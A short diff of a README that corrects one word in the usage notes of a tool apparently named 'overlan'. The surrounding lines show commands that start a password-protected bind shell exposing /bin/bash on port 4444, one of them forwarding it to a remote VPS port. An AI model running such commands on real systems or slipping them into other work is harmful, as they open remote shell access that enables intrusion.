@@ -188,7 +188,7 @@ Unix
 	
 - `overlan -l 4444 -e /bin/bash -k mypassowrd` - Password protected BindShell listen on localhost 4444.
 
-- `overlan -l 4444 -e /bin/bash -k mypassword -R username:hostname:port:password:8888` - Password protected BindShell listen on port 4444 and remote forwarded to your VPS port 8888.
+- `overlan -l 4444 -e /bin/bash -k mypassword -R username:hostname:port:password:8888` - Password protected BindShell listen on port 4444 and remote forward to your VPS port 8888.
 
 Windows
 
